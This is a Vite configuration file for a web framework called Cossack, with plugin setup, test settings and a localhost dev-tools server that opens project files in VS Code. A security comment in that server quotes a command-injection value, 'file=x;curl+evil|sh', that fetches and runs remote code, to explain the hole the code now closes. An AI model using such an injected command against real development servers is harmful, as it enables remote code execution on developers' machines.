/// <reference types="vitest/config" />
import { defineConfig, type Plugin } from 'vite';
import path from 'path';
import http from 'http';
import { spawn } from 'child_process';
import url from 'url';
import tailwindcss from '@tailwindcss/vite';
import { cloudflare } from '@cloudflare/vite-plugin';
import { cossackPages, cossackLang, cossackMiddlewares, cossackConfig } from './src/vite-plugin.ts';
import { cossackSecurityPlugin } from './src/vite-security-plugin.ts';
import { cossackSsg } from './src/vite-ssg-plugin.ts';
import { processMarkdown } from './src/markdown-processor.ts';

function cossackDevTools(): Plugin {
  return {
    name: 'cossack-devtools',
    configureServer() {
      const PORT = 3333;
      const projectRoot = path.resolve(process.cwd());

      const server = http.createServer((req, res) => {
        const parsedUrl = url.parse(req.url, true);

        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');

        if (req.method === 'OPTIONS') {
          res.end();
          return;
        }

        if (parsedUrl.pathname === '/open') {
          const file = parsedUrl.query.file;
          if (file) {
            // SECURITY: resolve the requested file and refuse anything outside
            // the project root. Combined with shell:false (no shell
            // interpretation of the arg) and binding to 127.0.0.1, this closes
            // the previous arbitrary-command-execution vector where any visited
            // webpage could POST ?file=x;curl+evil|sh to the all-interfaces
            // dev server.
            const resolved = path.resolve(projectRoot, String(file));
            if (resolved !== projectRoot && !resolved.startsWith(projectRoot + path.sep)) {
              res.statusCode = 403;
              res.end('file outside project');
              return;
            }
            console.log('[DevTools] Opening:', resolved);
            const child = spawn('code', ['-g', resolved], {
              stdio: 'ignore',
              detached: true,
            });
            child.unref();
            res.end('ok');
          } else {
            res.statusCode = 400;
            res.end('missing file');
          }
        } else {
          res.statusCode = 404;
          res.end();
        }
      });

      // Bind to localhost only so only local processes (not other machines on
      // the network) can reach the dev-only editor launcher.
      server.listen(PORT, '127.0.0.1', () => {
        console.log(`[DevTools] Server listening on http://localhost:${PORT}`);
      });
    },
  };
}

export default defineConfig({
  test: {
    // Playwright owns e2e/**/*.spec.ts. Keeping Vitest on the unit-test tree
    // prevents Playwright suites from being imported outside its runner.
    include: ['tests/**/*.test.ts'],
    environment: 'node',
  },
  plugins: [
    tailwindcss(),
    // Cloudflare plugin is incompatible with Vitest 4's resolve.external defaults.
    // Skip it during testing; unit tests don't need the Workers runtime.
    ...(process.env.VITEST ? [] : [
      cloudflare({
        viteEnvironment: { name: 'ssr' },
      }),
    ]),
    // Security plugin: strips server-only code from client bundle
    // Must run before cossackPages (enforce: 'pre') to process raw source
    cossackSecurityPlugin({
      devWarning: true,
    }),
    cossackPages({ markdownProcessor: processMarkdown }),
    cossackLang(),
    cossackMiddlewares(),
    cossackConfig(),
    // SSG: renders pages marked `@Page({ ssg: true })` to static HTML during
    // `vite build` (via a closeBundle hook). No-op in dev and under vitest.
    cossackSsg(),
    ...(process.env.VITEST ? [] : [cossackDevTools()]),
  ],
  build: {
    // Keep production SSR/worker output minified. Client builds inherit this
    // default as well (which matches Vite's normal production behavior).
    minify: true,
  },
  resolve: {
    alias: {
      '@': path.resolve(import.meta.dirname, './src'),
      '~': path.resolve(import.meta.dirname, './dist/client'),
    },
  },
  environments: {
    client: {
      build: {
        outDir: 'dist/client',
        target: 'esnext',
        manifest: true,
        rolldownOptions: {
          input: 'src/client/entry-client.ts',
          output: {
            entryFileNames: 'assets/[name].[hash].js',
            chunkFileNames: 'assets/[name].[hash].js',
            assetFileNames: 'assets/[name].[hash][extname]',
            format: 'esm',
            codeSplitting: {
              groups: [
                {
                  test: /@cossackframework\/(core|renderer)/,
                  name: 'cossack-framework',
                },
                {
                  test: /node_modules/,
                  name: 'vendor',
                },
              ],
            },
          }
        },
      },
    },
    ssr: {
      // The cloudflare plugin configures the SSR/worker environment
      // with viteEnvironment: { name: 'ssr' }
    },
  },
});
